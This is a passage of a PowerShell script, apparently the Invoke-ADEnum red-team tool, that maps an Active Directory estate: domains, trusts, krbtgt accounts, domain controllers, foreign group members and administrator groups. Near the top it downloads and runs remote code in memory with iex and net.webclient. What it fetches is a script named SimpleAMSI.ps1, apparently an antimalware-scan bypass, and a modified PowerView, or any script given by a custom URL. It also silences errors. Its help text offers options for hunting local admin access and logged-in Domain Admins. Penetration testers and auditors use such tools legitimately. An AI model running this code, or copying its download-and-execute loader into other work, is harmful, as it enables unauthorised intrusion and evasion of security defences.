function Invoke-ADEnum
{
	
    [CmdletBinding()] Param(

        [Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
        [String]
        $Domain,

        [Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
        [String]
        $Server,
        
        [Parameter (Mandatory=$False, Position = 2, ValueFromPipeline=$true)]
        [String]
        $Output,
	
		[Parameter (Mandatory=$False, Position = 3, ValueFromPipeline=$true)]
        [String]
        $Exclude,
		
		[Parameter (Mandatory=$False, Position = 4, ValueFromPipeline=$true)]
        [String]
        $CustomURL,
		
		[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
        [String]
        $Local,
        
        [Parameter (Mandatory=$False, Position = 6, ValueFromPipeline=$true)]
        [Switch]
        $NoServers,
        
        [Parameter (Mandatory=$False, Position = 7, ValueFromPipeline=$true)]
        [Switch]
        $Workstations,
        
        [Parameter (Mandatory=$False, Position = 8, ValueFromPipeline=$true)]
        [Switch]
        $NoUnsupportedOS,
        
        [Parameter (Mandatory=$False, Position = 9, ValueFromPipeline=$true)]
        [Switch]
        $DomainUsers,
        
        [Parameter (Mandatory=$False, Position = 10, ValueFromPipeline=$true)]
        [Switch]
        $Shares,
        
        [Parameter (Mandatory=$False, Position = 11, ValueFromPipeline=$true)]
        [Switch]
        $FindLocalAdminAccess,
        
        [Parameter (Mandatory=$False, Position = 12, ValueFromPipeline=$true)]
        [Switch]
        $DomainACLs,
        
        [Parameter (Mandatory=$False, Position = 13, ValueFromPipeline=$true)]
        [Switch]
        $NoGPOs,
		
		[Parameter (Mandatory=$False, Position = 14, ValueFromPipeline=$true)]
        [Switch]
        $MoreGPOs,
		
		[Parameter (Mandatory=$False, Position = 15, ValueFromPipeline=$true)]
        [Switch]
        $NoLAPS,
		
		[Parameter (Mandatory=$False, Position = 16, ValueFromPipeline=$true)]
        [Switch]
        $NoAppLocker,
		
		[Parameter (Mandatory=$False, Position = 17, ValueFromPipeline=$true)]
        [Switch]
        $NoVulnCertTemplates,
		
		[Parameter (Mandatory=$False, Position = 18, ValueFromPipeline=$true)]
        [Switch]
        $DomainOUs,
		
		[Parameter (Mandatory=$False, Position = 19, ValueFromPipeline=$true)]
        [Switch]
        $MoreOUs,
        
        [Parameter (Mandatory=$False, Position = 20, ValueFromPipeline=$true)]
        [Switch]
        $FindDomainUserLocation,
		
		[Parameter (Mandatory=$False, Position = 21, ValueFromPipeline=$true)]
        [Switch]
        $AllGroups,
		
		[Parameter (Mandatory=$False, Position = 22, ValueFromPipeline=$true)]
        [Switch]
        $TargetsOnly,
		
		[Parameter (Mandatory=$False, Position = 23, ValueFromPipeline=$true)]
        [Switch]
        $Debugging,
		
		[Parameter (Mandatory=$False, Position = 24, ValueFromPipeline=$true)]
        [Switch]
        $NoClear,
		
		[Parameter (Mandatory=$False, Position = 25, ValueFromPipeline=$true)]
        [Switch]
        $Help

    )
	
	if($Debugging){}
	else{
		$ErrorActionPreference = "SilentlyContinue"
		$WarningPreference = "SilentlyContinue"
	}
	
	Set-Variable MaximumHistoryCount 32767
	
	if($Local){ipmo $Local -Force}
	
	else{
		if($CustomURL){
			try{
				iex(new-object net.webclient).downloadstring("$CustomURL")
			}
			catch{
				$errorMessage = $_.Exception.Message
				Write-Host ""
				Write-Host "$errorMessage" -ForegroundColor Red
				Write-Host ""
				break
			}
		}
		
		else{
			try{
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView_Mod.ps1')
			}
			catch{
				$errorMessage = $_.Exception.Message
				Write-Host ""
				Write-Host "$errorMessage" -ForegroundColor Red
				Write-Host ""
				break
			}
		}
	}
    
    if($Domain){
		if($Server){}
		else{
			$Server = Get-DomainController -Domain $Domain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			if($Server){}
			else{$Server = Read-Host "Enter the DC FQDN"}
		}
    }

    elseif($Server -and !$Domain){
		$Domain = Read-Host "Enter the domain name"
		#$ServerParam = [Parameter(Mandatory=$True, Position=2, ValueFromPipeline=$true)][String]$Server
    }
    
    # Set the path and filename for the output file
    if($Output){$OutputFilePath = $Output}
    elseif($Domain){$OutputFilePath = "$pwd\Invoke-ADEnum_$Domain.txt"}
    else{$OutputFilePath = "$pwd\Invoke-ADEnum.txt"}
    
	if($TargetsOnly){}
	else{
		# Start capturing the script's output and save it to the file
		Start-Transcript -Path $OutputFilePath | Out-Null
	}
    
	if($NoClear){}
	else{clear}
    
    Write-Host "  _____                 _                      _____  ______                       " -ForegroundColor Red
    Write-Host " |_   _|               | |               /\   |  __ \|  ____|                      " -ForegroundColor Red
    Write-Host "   | |  _ ____   _____ | | _____ ______ /  \  | |  | | |__   _ __  _   _ _ __ ___  " -ForegroundColor Red
    Write-Host "   | | | '_ \ \ / / _ \| |/ / _ \______/ /\ \ | |  | |  __| | '_ \| | | | '_ ' _  \" -ForegroundColor Red
    Write-Host "  _| |_| | | \ V / (_) |   <  __/     / ____ \| |__| | |____| | | | |_| | | | | | |" -ForegroundColor Red
    Write-Host " |_____|_| |_|\_/ \___/|_|\_\___|    /_/    \_\_____/|______|_| |_|\__,_|_| |_| |_|" -ForegroundColor Red
	Write-Host ""
	Write-Host " [+] Rob LP (@L3o4j) https://github.com/Leo4j" -ForegroundColor Yellow
	
	if($Help){
		
		Write-Host "

PARAMETERS:

-Domain <domain FQDN>		The Domain to enumerate for. If not specified, the tool will enumerate for all the domains it can find

-Server <DC FQDN or IP>		The DC to bind to (requires you specify a Domain)

-Output <path-on-disk>		Specify where to save the output from the tool (default is pwd)		-Output C:\Windows\Temp\Invoke-ADEnum.txt

-Exclude <domain FQDN>		Exclude one or more domains from enumeration				-Exclude contoso.local,ad.example.org

-CustomURL <URL>		Specify the Server URL where you're hosting PowerView.ps1		-CustomURL http://yourserver.com/Tools/PowerView.ps1

-Local <path-on-disk>		Specify the local path to PowerView.ps1					-Local c:\Windows\Temp\PowerView.ps1


SWITCHES:

-TargetsOnly			Show Target Domains only - Will not create a Report

-NoServers			Do not enumerate for Servers

-Workstations			Enumerate for Workstations

-NoUnsupportedOS		Do not enumerate for machines running unsupported OS

-DomainUsers			Enumerate for Users

-Shares				Enumerate for Shares

-FindLocalAdminAccess		Enumerate for Machines where the Current User is Local Admin

-DomainACLs			Enumerate for Domain ACLs

-NoGPOs				Do not enumerate for GPOs and Who can Modify/Link them

-MoreGPOs			More enumeration leveraging GPOs

-NoLAPS				Do not enumerate for LAPS GPO

-NoAppLocker			Do not enumerate for AppLocker GPO

-NoVulnCertTemplates		Do not enumerate for Misconfigured Certificate Templates

-DomainOUs			Enumerate for Organizational Units

-MoreOUs			More enumeration leveraging Organizational Units

-FindDomainUserLocation		Enumerate for Machines where Domain Admins are Logged into

-AllGroups			Enumerate for All Domain Groups

-Help				Show this Help page


EXAMPLES:

Invoke-ADEnum

Invoke-ADEnum -TargetsOnly -Local C:\Users\m.seitz\Downloads\PowerView.ps1

Invoke-ADEnum -Domain contoso.local -Server DC01.contoso.local

Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt

Invoke-ADEnum -Exclude contoso.local,domain.local -NoVulnCertTemplates

Invoke-ADEnum -CustomURL http://yourserver.com/Tools/PowerView.ps1


FULL ENUMERATION: (may take a long time)

Invoke-ADEnum -Workstations -DomainUsers -Shares -FindLocalAdminAccess -DomainACLs -MoreGPOs -DomainOUs -MoreOUs -FindDomainUserLocation -AllGroups

		"
		
		break
		
	}
	
	$header = "
		<style>

			h1 {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff781f;
				font-size: 35px;

			}
			
			h2 {

				font-family: Arial, Helvetica, sans-serif;
				color: #2f9fb3;
				font-size: 20px;

			}
			
			h3 {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff781f;
				font-size: 20px;

			}

			
			
		   table {
				font-size: 15px;
				border: 0px; 
				font-family: Arial, Helvetica, sans-serif;
			} 
			
			td {
				padding: 8px;
				margin: 0px;
				border: 0;
			}
			
			th {
				background: #395870;
				background: linear-gradient(#49708f, #293f50);
				color: #fff;
				font-size: 15px;
				padding: 10px 15px;
				vertical-align: middle;
			}

			tbody tr:nth-child(even) {
				background: #f0f0f2;
			}

				#CreationDate {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff3300;
				font-size: 12px;

			}
			
		</style>
	"
	
	$TopLevelBanner = "<h1>Active Directory Audit</h1>"
	
	$EnvironmentTable = [PSCustomObject]@{
		"Run as User" = "$env:USERDOMAIN\$env:USERNAME"
		Domain = $env:USERDNSDOMAIN
		Machine = $env:computername + '.' + $env:USERDNSDOMAIN
		"Date and Time" = Get-Date
	}
	
	$HTMLEnvironmentTable = $EnvironmentTable | ConvertTo-Html -As List -Fragment
    
    # All Domains
    $ParentDomain = (Get-NetDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
    $ChildDomains = (Get-NetDomain -Domain $ParentDomain | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)

    if($ChildDomains){
        $AllDomains = $ParentDomain + "`n"
        foreach($ChildDomain in $ChildDomains){
            $AllDomains += $ChildDomain + "`n"
        }
        $AllDomains = ($AllDomains | Out-String) -split "`n"
        $AllDomains = $AllDomains.Trim()
        $AllDomains = $AllDomains | Where-Object { $_ -ne "" }
    }

    else{
    	$AllDomains = $ParentDomain + "`n"
    	$AllDomains = ($AllDomains | Out-String) -split "`n"
        $AllDomains = $AllDomains.Trim()
        $AllDomains = $AllDomains | Where-Object { $_ -ne "" }
    }
    
    # Trust Domains (save to variable)
    
    if($Domain -AND $Server) {
        $TrustTargetNames = (Get-DomainTrust -Domain $Domain -Server $Server).TargetName
        $TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
        $TrustTargetNames = $TrustTargetNames.Trim()
        $TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
        $TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
        $TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $Domain }
    }
    
    else{
        $TrustTargetNames = foreach($AllDomain in $AllDomains){(Get-DomainTrust -Domain $AllDomain).TargetName}
        $TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
        $TrustTargetNames = $TrustTargetNames.Trim()
        $TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
        $TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
        $TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $AllDomains }
    }
    
    # Remove Outbound Trust from $AllDomains
    
    if($Domain -AND $Server) {
        $OutboundTrusts = Get-DomainTrust -Domain $Domain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName
    }
    
    else{
        $OutboundTrusts = foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName}
    }
    
    $AllDomains = $AllDomains + "`n"
    
    foreach($TrustTargetName in $TrustTargetNames){
    	$AllDomains += $TrustTargetName + "`n"
    }
    
    $AllDomains = ($AllDomains | Out-String) -split "`n"
    $AllDomains = $AllDomains.Trim()
    $AllDomains = $AllDomains | Where-Object { $_ -ne "" }
    $AllDomains = $AllDomains | Sort-Object -Unique
    
    #$AllDomains += $TrustTargetNames
    $PlaceHolderDomains = $AllDomains
    $AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }
    
    if($Exclude){
		$ExcludeDomains = $Exclude -split ','
		$AllDomains = $AllDomains | Where-Object { $_ -notin $ExcludeDomains }
	}
	
	$inactiveThreshold = (Get-Date).AddMonths(-6)
	
	#############################################
    ############# Target Domains ################
	#############################################
	
	Write-Host ""
    Write-Host ""
    Write-Host "Target Domains:" -ForegroundColor Cyan
    if ($Domain -and $Server) {
		$TargetDomain = Get-NetDomain -Domain $Domain
		$TempTargetDomain = foreach ($TDomain in $TargetDomain) {
			[PSCustomObject]@{
				"Domain" = $TDomain.Name
				"NetBIOS Name" = ([ADSI]"LDAP://$TDomain").dc -Join " - "
				"DomainSID" = (Get-DomainSID -Domain $TDomain.Name)
				"Forest" = $TDomain.Forest
				"Parent" = $TDomain.Parent
				"Children" = ($TDomain.Children -join ', ')
				"DomainControllers" = ($TDomain.DomainControllers -join ', ')
			}
		}

		if ($TempTargetDomain) {
			$TempTargetDomain | Format-Table -AutoSize -Wrap
			$HTMLTargetDomain = $TempTargetDomain | ConvertTo-Html -Fragment -PreContent "<h2>Target Domains</h2>"
		}
	}
	
    else{
		$TempTargetDomains = foreach($AllDomain in $AllDomains){
			$TargetDomain = Get-NetDomain -Domain $AllDomain
			
			[PSCustomObject]@{
				Domain = $TargetDomain.Name
				"NetBIOS Name" = ([ADSI]"LDAP://$AllDomain").dc -Join " - "
				"Domain SID"  = Get-DomainSID -Domain $TargetDomain.Name
				Forest = $TargetDomain.Forest
				Parent = $TargetDomain.Parent
				Children = $TargetDomain.Children -join ' - '
				"Domain Controllers" = $TargetDomain.DomainControllers -join ' - '
			}
		}
		if($TempTargetDomains){
			$TempTargetDomains | ft -Autosize -Wrap
			$HTMLTargetDomain = $TempTargetDomains | ConvertTo-Html -Fragment -PreContent "<h2>Target Domains</h2>"
		}
    }
	
	if($TargetsOnly){break}
	else{}
	
	#############################################
    ############ Krbtgt Accounts ################
	#############################################
	
    Write-Host ""
    Write-Host "Krbtgt Accounts" -ForegroundColor Cyan
    if($Domain -AND $Server) {
		$KrbtgtAccount = Get-DomainObject -Identity krbtgt -Domain $Domain
        $KrbtgtAccount | Select-Object @{Name = 'Account'; Expression = {$_.samaccountname}}, @{Name = 'Service Principal Name'; Expression = {$_.serviceprincipalname}}, @{Name = 'SID'; Expression = {$_.objectsid}}, @{Name = 'Last Krbtgt Change'; Expression = {$_.whencreated}} | ft -Autosize -Wrap
		if($KrbtgtAccount){
			$HTMLKrbtgtAccount = $KrbtgtAccount | Select-Object @{Name = 'Account'; Expression = {$_.samaccountname}}, @{Name = 'Account SID'; Expression = {$_.objectsid}}, @{Name = 'Service Principal Name'; Expression = {$_.serviceprincipalname}}, @{Name = 'Last Krbtgt Change'; Expression = {$_.whencreated}} | ConvertTo-Html -Fragment -PreContent "<h2>Krbtgt Accounts</h2>"
		}
    }
    else{
		$TempKrbtgtAccount = foreach($AllDomain in $AllDomains){
			$KrbtgtAccount = Get-DomainObject -Identity krbtgt -Domain $AllDomain
			
			[PSCustomObject]@{
				Account = $KrbtgtAccount.samaccountname
				"Account SID"  = $KrbtgtAccount.objectsid
				"Service Principal Name" = $KrbtgtAccount.serviceprincipalname
				"Last Krbtgt Change" = $KrbtgtAccount.whencreated
			}
		}
		if($TempKrbtgtAccount){
			$TempKrbtgtAccount | ft -Autosize -Wrap
			$HTMLKrbtgtAccount = $TempKrbtgtAccount | ConvertTo-Html -Fragment -PreContent "<h2>Krbtgt Accounts</h2>"
		}
    }
	
	#############################################
    ########## Domain Controllers ###############
	#############################################
	
	Write-Host ""
    Write-Host "Domain Controllers:" -ForegroundColor Cyan
    if($Domain -AND $Server) {
        $domainControllers = Get-DomainController -Domain $Domain
    	$TempHTMLdc = foreach ($dc in $domainControllers) {
        	$isPrimaryDC = $dc.Roles -like "RidRole"
        	$primaryDC = if($isPrimaryDC) {"YES"} else {"NO"}
        	
			[PSCustomObject]@{
				"DC Name" = $dc.Name
				Forest = $dc.Forest
				Domain = $dc.Domain
				"IP Address" = $dc.IPAddress
				"Primary DC" = $primaryDC
			}
    	}
		if($TempHTMLdc){
			$TempHTMLdc | ft -Autosize -Wrap
			$HTMLdc = $TempHTMLdc | ConvertTo-Html -Fragment -PreContent "<h2>Domain Controllers</h2>"
		}
    }
    else{
        $TempHTMLdc = foreach($AllDomain in $AllDomains){
			$domainControllers = Get-DomainController -Domain $AllDomain
        	foreach ($dc in $domainControllers) {
				$isPrimaryDC = $dc.Roles -like "RidRole"
				$primaryDC = if($isPrimaryDC) {"YES"} else {"NO"}
				[PSCustomObject]@{
					"DC Name" = $dc.Name
					Forest = $dc.Forest
					Domain = $dc.Domain
					"IP Address" = $dc.IPAddress
					"Primary DC" = $primaryDC
				}
        	}
		}
		if($TempHTMLdc ){
			$TempHTMLdc | ft -Autosize -Wrap
			$HTMLdc = $TempHTMLdc | ConvertTo-Html -Fragment -PreContent "<h2>Domain Controllers</h2>"
		}
    }
	
	#############################################
    ###### Domains for the current forest #######
	#############################################
    
    Write-Host ""
	Write-Host "Domains for the current forest:" -ForegroundColor Cyan
	$GetForestDomains = Get-ForestDomain
	$TempForestDomain = foreach ($GetForestDomain in $GetForestDomains) {
		[PSCustomObject]@{
			"Domain" = $GetForestDomain.Name
			"Forest" = $GetForestDomain.Forest
			"Domain Controllers" = $GetForestDomain.DomainControllers -join ', '
			"Parent" = $GetForestDomain.Parent
			"Children" = $GetForestDomain.Children -join ', '
			"Domain Mode" = $GetForestDomain.DomainMode
			"Domain Mode Level" = $GetForestDomain.DomainModeLevel
			"Pdc Role Owner" = $GetForestDomain.PdcRoleOwner
			"Rid Role Owner" = $GetForestDomain.RidRoleOwner
			"Infrastructure Role Owner" = $GetForestDomain.InfrastructureRoleOwner
		}
	}

	if ($TempForestDomain) {
		$TempForestDomain | Format-Table -AutoSize -Wrap
		$HTMLForestDomain = $TempForestDomain | ConvertTo-Html -Fragment -PreContent "<h2>Domains for the current forest</h2>"
	}

    #############################################
    ########### Forest Global Catalog ###########
	#############################################
	
	Write-Host ""
	Write-Host "Forest Global Catalog:" -ForegroundColor Cyan
	$GetForestGlobalCatalog = Get-ForestGlobalCatalog
	$TempForestGlobalCatalog = foreach ($GC in $GetForestGlobalCatalog) {
		[PSCustomObject]@{
			"DC Name" = $GC.Name
			"Forest" = $GC.Forest
			"Domain" = $GC.Domain
			"OS Version" = $GC.OSVersion
			"IP Address" = $GC.IPAddress
		}
	}

	if ($TempForestGlobalCatalog) {
		$TempForestGlobalCatalog | Format-Table -AutoSize -Wrap
		$HTMLForestGlobalCatalog = $TempForestGlobalCatalog | ConvertTo-Html -Fragment -PreContent "<h2>Forest Global Catalog</h2>"
	}


    #############################################
    ############### Domain Trusts ###############
	#############################################
	
	Write-Host ""
	Write-Host "Domain Trusts:" -ForegroundColor Cyan
	
    if($Domain -AND $Server) {
		$GetDomainTrusts = Get-DomainTrust -Domain $Domain -Server $Server
		
		$TempGetDomainTrust = foreach ($GetDomainTrust in $GetDomainTrusts) {
			[PSCustomObject]@{
				"Source Name" = $GetDomainTrust.SourceName
				"Target Name" = $GetDomainTrust.TargetName
				"Trust Type" = $GetDomainTrust.TrustType
				"Trust Attributes" = $GetDomainTrust.TrustAttributes
				"Trust Direction" = $GetDomainTrust.TrustDirection
				"When Created" = $GetDomainTrust.WhenCreated
				"When Changed" = $GetDomainTrust.WhenChanged
			}
		}
		
		if($TempGetDomainTrust){
			$TempGetDomainTrust | Format-Table -AutoSize -Wrap
			$HTMLGetDomainTrust = $TempGetDomainTrust | ConvertTo-Html -Fragment -PreContent "<h2>Domain Trusts</h2>"
		}
    }
    
    else{
        $TempGetDomainTrust = foreach($AllDomain in $AllDomains){
			$GetDomainTrusts = Get-DomainTrust -Domain $AllDomain
			
			foreach ($GetDomainTrust in $GetDomainTrusts) {
				[PSCustomObject]@{
					"Source Name" = $GetDomainTrust.SourceName
					"Target Name" = $GetDomainTrust.TargetName
					"Trust Type" = $GetDomainTrust.TrustType
					"Trust Attributes" = $GetDomainTrust.TrustAttributes
					"Trust Direction" = $GetDomainTrust.TrustDirection
					"When Created" = $GetDomainTrust.WhenCreated
					"When Changed" = $GetDomainTrust.WhenChanged
				}
			}
		}
		
		if($TempGetDomainTrust){
			$TempGetDomainTrust | Format-Table -AutoSize -Wrap
			$HTMLGetDomainTrust = $TempGetDomainTrust | ConvertTo-Html -Fragment -PreContent "<h2>Domain Trusts</h2>"
		}
    }
	
	#############################################
    ############## Trust Accounts ###############
	#############################################
    
    Write-Host ""
    Write-Host "Trust Accounts:" -ForegroundColor Cyan
    if($Domain -AND $Server) {
		$TrustAccounts = Get-DomainObject -Domain $Domain -Server $Server -LDAPFilter "(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2048)"
		
		$TempTrustAccounts = foreach($TrustAccount in $TrustAccounts){
			
			[PSCustomObject]@{
				Domain = $Domain
				"SAM Account Name" = $TrustAccount.samaccountname
				"Object SID" = $TrustAccount.objectsid
				"Object GUID" = $TrustAccount.objectguid
				"SAM Account Type" = $TrustAccount.samaccounttype
			}
		}
		
		if($TempTrustAccounts){
			$TempTrustAccounts | ft -AutoSize -Wrap
			$HTMLTrustAccounts = $TempTrustAccounts | ConvertTo-Html -Fragment -PreContent "<h2>Trust Accounts</h2>"
		}
		
    }
	
    else{
		$TempTrustAccounts = foreach($AllDomain in $AllDomains){
			$TrustAccounts = Get-DomainObject -Domain $AllDomain -LDAPFilter "(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2048)"
			
			foreach($TrustAccount in $TrustAccounts){
				
				[PSCustomObject]@{
					Domain = $AllDomain
					"SAM Account Name" = $TrustAccount.samaccountname
					"Object SID" = $TrustAccount.objectsid
					"Object GUID" = $TrustAccount.objectguid
					"SAM Account Type" = $TrustAccount.samaccounttype
				}
			}
		}
		
		if($TempTrustAccounts){
			$TempTrustAccounts | ft -AutoSize -Wrap
			$HTMLTrustAccounts = $TempTrustAccounts | ConvertTo-Html -Fragment -PreContent "<h2>Trust Accounts</h2>"
		}
    }
	
	#############################################
    ####### Trusted Domain Object GUIDs #########
	#############################################

    Write-Host ""
    Write-Host "Trusted Domain Object GUIDs:" -ForegroundColor Cyan
    if($Domain -AND $Server) {
		$TDOTargetNames = Get-DomainTrust -Domain $Domain -Server $Server | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName
		$TDOTrustDirection = "Outbound"
		$TDOTargetNames = ($TDOTargetNames | Out-String) -split "`n"
		$TDOTargetNames = $TDOTargetNames.Trim()
		$TDOTargetNames = $TDOTargetNames | Where-Object { $_ -ne "" }
		
		$TDOSourceDomainName = "DC=" + $Domain.Split(".")
		$TDOSourceDomainName = $TDOSourceDomainName -replace " ", ",DC="
		$TempTrustedDomainObjectGUIDs = foreach($TDOTargetName in $TDOTargetNames){
			$TrustedDomainObjectGUIDs = Get-DomainObject -Domain $Domain -Server $Server -Identity "CN=$TDOTargetName,CN=System,$TDOSourceDomainName"
			
			foreach ($TrustedDomainObjectGUID in $TrustedDomainObjectGUIDs) {
				[PSCustomObject]@{
					"Source Name" = $Domain
					"Target Name" = $TDOTargetName
					"Trust Direction" = $TDOTrustDirection
					"Object GUID" = $TrustedDomainObjectGUID.objectGuid
				}
			}
		}
		if($TempTrustedDomainObjectGUIDs){
			$TempTrustedDomainObjectGUIDs | ft -AutoSize -Wrap
			$HTMLTrustedDomainObjectGUIDs = $TempTrustedDomainObjectGUIDs | ConvertTo-Html -Fragment -PreContent "<h2>Trusted Domain Object GUIDs</h2>"
		}
    }
	
    else{
		$TDOTargetNames = foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName}
		$TDOTrustDirection = "Outbound"
		$TDOTargetNames = ($TDOTargetNames | Out-String) -split "`n"
		$TDOTargetNames = $TDOTargetNames.Trim()
		$TDOTargetNames = $TDOTargetNames | Where-Object { $_ -ne "" }
		
		$TempTrustedDomainObjectGUIDs = foreach($AllDomain in $AllDomains){
			$TDOSourceDomainName = "DC=" + $AllDomain.Split(".")
			$TDOSourceDomainName = $TDOSourceDomainName -replace " ", ",DC="
			foreach($TDOTargetName in $TDOTargetNames){
				$TrustedDomainObjectGUIDs = Get-DomainObject -Domain $AllDomain -Identity "CN=$TDOTargetName,CN=System,$TDOSourceDomainName"
				
				foreach ($TrustedDomainObjectGUID in $TrustedDomainObjectGUIDs) {
					[PSCustomObject]@{
						"Source Name" = $AllDomain
						"Target Name" = $TDOTargetName
						"Trust Direction" = $TDOTrustDirection
						"Object GUID" = $TrustedDomainObjectGUID.objectGuid
					}
				}
			}
		}
		if($TempTrustedDomainObjectGUIDs){
			$TempTrustedDomainObjectGUIDs | ft -AutoSize -Wrap
			$HTMLTrustedDomainObjectGUIDs = $TempTrustedDomainObjectGUIDs | ConvertTo-Html -Fragment -PreContent "<h2>Trusted Domain Object GUIDs</h2>"
		}
    }
	
	#############################################
    ################ Outsiders ##################
	#############################################
        
    Write-Host ""
	Write-Host "Groups that contain users outside of its domain and return its members:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$ForeignGroupMembers = Get-DomainForeignGroupMember -Domain $Domain -Server $Server

		$TempForeignGroupMembers = foreach ($ForeignGroupMember in $ForeignGroupMembers) {
			[PSCustomObject]@{
				"GroupDomain" = $ForeignGroupMember.GroupDomain
				"GroupName" = $ForeignGroupMember.GroupName
				"GroupDistinguishedName" = $ForeignGroupMember.GroupDistinguishedName
				"MemberDomain" = $ForeignGroupMember.MemberDomain
				"Member|GroupName" = (ConvertFrom-SID $ForeignGroupMember.MemberName)
				"Members" = (Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity (ConvertFrom-SID $ForeignGroupMember.MemberName)).MemberName -join ' - '
				"SID" = $ForeignGroupMember.MemberName
			}
		}

		if ($TempForeignGroupMembers) {
			$TempForeignGroupMembers | Where {$_."Member|GroupName"} | Format-Table -AutoSize -Wrap
			$HTMLGetDomainForeignGroupMember = $TempForeignGroupMembers | ConvertTo-Html -Fragment -PreContent "<h2>Groups that contain users outside of its domain and return its members</h2>"
		}
	}

	else {
		$TempForeignGroupMembers = foreach ($AllDomain in $AllDomains) {
			$ForeignGroupMembers = Get-DomainForeignGroupMember -Domain $AllDomain

			foreach ($ForeignGroupMember in $ForeignGroupMembers) {
				[PSCustomObject]@{
					"GroupDomain" = $ForeignGroupMember.GroupDomain
					"GroupName" = $ForeignGroupMember.GroupName
					"GroupDistinguishedName" = $ForeignGroupMember.GroupDistinguishedName
					"MemberDomain" = $ForeignGroupMember.MemberDomain
					"Member|GroupName" = (ConvertFrom-SID $ForeignGroupMember.MemberName)
					"Members" = (Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity (ConvertFrom-SID $ForeignGroupMember.MemberName)).MemberName -join ' - '
					"SID" = $ForeignGroupMember.MemberName
				}
			}
		}

		if ($TempForeignGroupMembers) {
			$TempForeignGroupMembers | Where {$_."Member|GroupName"} | Format-Table -AutoSize -Wrap
			$HTMLGetDomainForeignGroupMember = $TempForeignGroupMembers | ConvertTo-Html -Fragment -PreContent "<h2>Groups that contain users outside of its domain and return its members</h2>"
		}
	}

	
	####################################################
    ########### Built-In Administrators ################
	####################################################
	
	Write-Host ""
    Write-Host "Built-In Administrators:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$BuiltInAdministrators = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Administrators"
		$TempBuiltInAdministrators = foreach($BuiltInAdministrator in $BuiltInAdministrators){
			[PSCustomObject]@{
				"Member Name" = $BuiltInAdministrator.MemberName
				"Enabled" = if ($BuiltInAdministrator.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ((Get-DomainUser -Identity $BuiltInAdministrator.MemberName -Domain $Domain -Server $Server).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Last Logon" = (Get-DomainUser -Identity $BuiltInAdministrator.MemberName -Domain $Domain -Server $Server).lastlogontimestamp
				"Member SID" = $BuiltInAdministrator.MemberSID
				"Group Domain" = $BuiltInAdministrator.GroupDomain
			}
		}

		if ($TempBuiltInAdministrators) {
			$TempBuiltInAdministrators | ft -Autosize -Wrap
			$HTMLEnterpriseAdmins = $TempBuiltInAdministrators | ConvertTo-Html -Fragment -PreContent "<h2>Built-In Administrators</h2>"
		}
	}
	else {
		$TempBuiltInAdministrators = foreach ($AllDomain in $AllDomains) {
			$BuiltInAdministrators = Get-DomainGroupMember -Domain $AllDomain -Identity "Administrators"
			foreach($BuiltInAdministrator in $BuiltInAdministrators){
				[PSCustomObject]@{
					"Member Name" = $BuiltInAdministrator.MemberName
					"Enabled" = if ($BuiltInAdministrator.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ((Get-DomainUser -Identity $BuiltInAdministrator.MemberName -Domain $AllDomain).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Last Logon" = (Get-DomainUser -Identity $BuiltInAdministrator.MemberName -Domain $AllDomain).lastlogontimestamp
					"Member SID" = $BuiltInAdministrator.MemberSID
					"Group Domain" = $BuiltInAdministrator.GroupDomain
				}
			}
		}
		
		if ($TempBuiltInAdministrators) {
			$TempBuiltInAdministrators | ft -Autosize -Wrap
			$HTMLBuiltInAdministrators = $TempBuiltInAdministrators | ConvertTo-Html -Fragment -PreContent "<h2>Built-In Administrators</h2>"
		}
	}
	
	######################################################
    ########### Enterprise Administrators ################
	######################################################
	
	Write-Host ""
    Write-Host "Enterprise Administrators:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$EnterpriseAdmins = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Enterprise Admins" -Recurse
		$TempEnterpriseAdmins = foreach($EnterpriseAdmin in $EnterpriseAdmins){
			[PSCustomObject]@{
				"Member Name" = $EnterpriseAdmin.MemberName
				"Enabled" = if ($EnterpriseAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ((Get-DomainUser -Identity $EnterpriseAdmin.MemberName -Domain $Domain -Server $Server).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
